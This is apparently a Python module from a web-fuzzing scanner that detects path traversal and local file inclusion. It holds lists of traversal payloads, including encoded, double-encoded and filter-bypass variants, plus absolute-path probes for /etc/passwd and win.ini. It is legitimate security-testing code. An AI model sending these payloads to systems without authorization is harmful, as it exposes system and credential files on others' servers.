from .base import BaseLightfuzz
from bbot.errors import HttpCompareError

from urllib.parse import quote


class path(BaseLightfuzz):
    """
    Detects path traversal and local file inclusion vulnerabilities

    Techniques:

    * Relative Path Traversal:
       - Tests various relative path traversal patterns (../, ./, .../, etc.)
       - Uses multiple encoding variations (URL encoding, double encoding)
       - Attempts various path validation bypass techniques

    * Absolute Path Traversal:
       - Tests absolute paths for Windows (c:\\windows\\win.ini)
       - Tests absolute paths for Unix (/etc/passwd)
       - Tests null byte injection for extension bypass (%00)

    Results are validated using multiple confirmations and WAF response filtering to eliminate false positives.
    """

    friendly_name = "Path Traversal"

    async def fuzz(self):
        cookies = self.event.data.get("assigned_cookies", {})
        probe_value = self.incoming_probe_value(populate_empty=False)
        if not probe_value:
            self.debug(
                f"Path Traversal detection requires original value, aborting [{self.event.data['type']}] [{self.event.data['name']}]"
            )
            return

        # Single dot traversal tolerance test.
        # The `a/../` variants require the intermediate dummy path component to
        # exist during OS path walking (works for frameworks that string-normalize
        # before open(), like PHP include). The `simple` variants omit the dummy
        # component so they also trigger against stacks that pass paths raw to
        # the kernel (Python open(), Go os.Open, Rust File::open, etc.).
        path_techniques = {
            "single-dot traversal tolerance (simple, no-encoding)": {
                "singledot_payload": f"./{probe_value}",
                "doubledot_payload": f"../{probe_value}",
            },
            "single-dot traversal tolerance (simple, leading slash)": {
                "singledot_payload": f"/./{probe_value}",
                "doubledot_payload": f"/../{probe_value}",
            },
            "single-dot traversal tolerance (simple, url-encoding)": {
                "singledot_payload": quote(f"./{probe_value}".encode(), safe=""),
                "doubledot_payload": quote(f"../{probe_value}".encode(), safe=""),
            },
            "single-dot traversal tolerance (no-encoding)": {
                "singledot_payload": f"./a/../{probe_value}",
                "doubledot_payload": f"../a/../{probe_value}",
            },
            "single-dot traversal tolerance (no-encoding, leading slash)": {
                "singledot_payload": f"/./a/../{probe_value}",
                "doubledot_payload": f"/../a/../{probe_value}",
            },
            "single-dot traversal tolerance (url-encoding)": {
                "singledot_payload": quote(f"./a/../{probe_value}".encode(), safe=""),
                "doubledot_payload": quote(f"../a/../{probe_value}".encode(), safe=""),
            },
            "single-dot traversal tolerance (url-encoding, leading slash)": {
                "singledot_payload": quote(f"/./a/../{probe_value}".encode(), safe=""),
                "doubledot_payload": quote(f"/../a/../{probe_value}".encode(), safe=""),
            },
            "single-dot traversal tolerance (non-recursive stripping)": {
                "singledot_payload": f"...//a/....//{probe_value}",
                "doubledot_payload": f"....//a/....//{probe_value}",
            },
            "single-dot traversal tolerance (non-recursive stripping, leading slash)": {
                "singledot_payload": f"/...//a/....//{probe_value}",
                "doubledot_payload": f"/....//a/....//{probe_value}",
            },
            # Simple (no-`a/`-intermediate) variants for servers that
            # reject paths whose intermediate components don't exist.
            "single-dot traversal tolerance (non-recursive stripping, simple)": {
                "singledot_payload": f"...//{probe_value}",
                "doubledot_payload": f"....//{probe_value}",
            },
            "single-dot traversal tolerance (non-recursive stripping, simple, leading slash)": {
                "singledot_payload": f"/...//{probe_value}",
                "doubledot_payload": f"/....//{probe_value}",
            },
            "single-dot traversal tolerance (double url-encoding)": {
                "singledot_payload": f".%252fa%252f..%252f{probe_value}",
                "doubledot_payload": f"..%252fa%252f..%252f{probe_value}",
            },
            "single-dot traversal tolerance (double url-encoding, leading slash)": {
                "singledot_payload": f"%252f.%252fa%252f..%252f{probe_value}",
                "doubledot_payload": f"%252f..%252fa%252f..%252f{probe_value}",
            },
            # Simple (no-`a/`-intermediate) variants for strict path resolvers.
            "single-dot traversal tolerance (double url-encoding, simple)": {
                "singledot_payload": f".%252f{probe_value}",
                "doubledot_payload": f"..%252f{probe_value}",
            },
            "single-dot traversal tolerance (double url-encoding, simple, leading slash)": {
                "singledot_payload": f"%252f.%252f{probe_value}",
                "doubledot_payload": f"%252f..%252f{probe_value}",
            },
        }

        compiled_regex = self.lightfuzz.helpers.re.compile(r"/(?:[\w-]+/)*[\w-]+\.\w+")
        linux_path_regex = await self.lightfuzz.helpers.re.match(compiled_regex, probe_value)
        if linux_path_regex is not None:
            original_path_only = "/".join(probe_value.split("/")[:-1])
            original_filename_only = probe_value.split("/")[-1]
            # Some servers validate the start of the path, so we construct our payload with the original path and filename
            path_techniques["single-dot traversal tolerance (start of path validation)"] = {
                "singledot_payload": f"{original_path_only}/./{original_filename_only}",
                "doubledot_payload": f"{original_path_only}/../{original_filename_only}",
            }

        for path_technique, payloads in path_techniques.items():
            iterations = 5  # one failed detection is tolerated, as long as its not the first run
            confirmations = 0
            while iterations > 0:
                try:
                    http_compare = self.compare_baseline(
                        self.event.data["type"], probe_value, cookies, skip_urlencoding=True
                    )
                    singledot_probe = await self.compare_probe(
                        http_compare,
                        self.event.data["type"],
                        payloads["singledot_payload"],
                        cookies,
                        skip_urlencoding=True,
                    )
                    doubledot_probe = await self.compare_probe(
                        http_compare,
                        self.event.data["type"],
                        payloads["doubledot_payload"],
                        cookies,
                        skip_urlencoding=True,
                    )
                    # if singledot_probe[0] is true, the response is the same as the baseline. This indicates adding a single dot did not break the functionality
                    # next, if doubledot_probe[0] is false, the response is different from the baseline. This further indicates that a real path is being manipulated
                    # if doubledot_probe[3] is not None, the response is not empty.
                    # if doubledot_probe[1] is not ["header"], the response is not JUST a header change.
                    # The doubledot response must look like a successful fetch of a different
                    # resource (2xx with body) — a 4xx/5xx is the server *rejecting* the `..`,
                    # which is the opposite of a vulnerability and was previously flagged because
                    # any non-baseline response satisfied `[0] is False`.
                    # "The requested URL was rejected" is a very common WAF error message which appears on 200 OK response, confusing detections
                    doubledot_response = doubledot_probe[3]
                    doubledot_is_success = (
                        doubledot_response is not None
                        and 200 <= doubledot_response.status_code < 300
                        and bool(doubledot_response.text)
                    )
                    if (
                        singledot_probe[0] is True
                        and doubledot_probe[0] is False
                        and doubledot_is_success
                        and doubledot_probe[1] != ["header"]
                        and not await self.lightfuzz.helpers.yara.match(
                            self.lightfuzz.waf_yara_rules, doubledot_response.text
                        )
                    ):
                        # Canary check: a real path traversal would 404/500 on a random non-existent
                        # filename, but a search/filter field returns 200 with an empty results page
                        # for any input. If the canary also returns 200 with a body, it's a search
                        # field, not a file path handler — break to avoid an FP.
                        canary_name = self.lightfuzz.helpers.rand_string(10, digits=False)
                        canary_payload = payloads["doubledot_payload"].replace(probe_value, canary_name)
                        canary_probe = await self.compare_probe(
                            http_compare,
                            self.event.data["type"],
                            canary_payload,
                            cookies,
                            skip_urlencoding=True,
                        )
                        canary_response = canary_probe[3]
                        canary_is_success = (
                            canary_response is not None
                            and 200 <= canary_response.status_code < 300
                            and bool(canary_response.text)
                        )
                        if canary_is_success:
                            self.debug(
                                f"Path Traversal canary check failed: random filename also returned "
                                f"{canary_response.status_code} (likely a search/filter field, not a file path)"
                            )
                            break
                        confirmations += 1
                        self.verbose(f"Got possible Path Traversal detection: [{str(confirmations)}] Confirmations")
                        # only report if we have 3 confirmations
                        if confirmations > 3:
                            self.results.append(
                                {
                                    "name": "Possible Path Traversal",
                                    "severity": "HIGH",
                                    "confidence": "LOW",
                                    "description": f"POSSIBLE Path Traversal. {self.metadata()} Detection Method: [{path_technique}]",
                                }
                            )
                            # no need to report both techniques if they both work
                            break
                except HttpCompareError as e:
                    iterations -= 1
                    self.debug(e)
                    continue

                iterations -= 1
                if confirmations == 0:
                    break

        # Absolute path test, covering Windows and Linux
        absolute_paths = {
            r"c:\\windows\\win.ini": "; for 16-bit app support",
            "/etc/passwd": "daemon:x:",
            "../../../../../etc/passwd%00.png": "daemon:x:",
        }

        for path, trigger in absolute_paths.items():
            r = await self.standard_probe(self.event.data["type"], cookies, path, skip_urlencoding=True)
            if r and trigger in r.text:
                self.results.append(
                    {
                        "name": "Possible Path Traversal",
                        "severity": "HIGH",
                        "confidence": "MEDIUM",
                        "description": f"POSSIBLE Path Traversal. {self.metadata()} Detection Method: [Absolute Path: {path}]",
                    }
                )
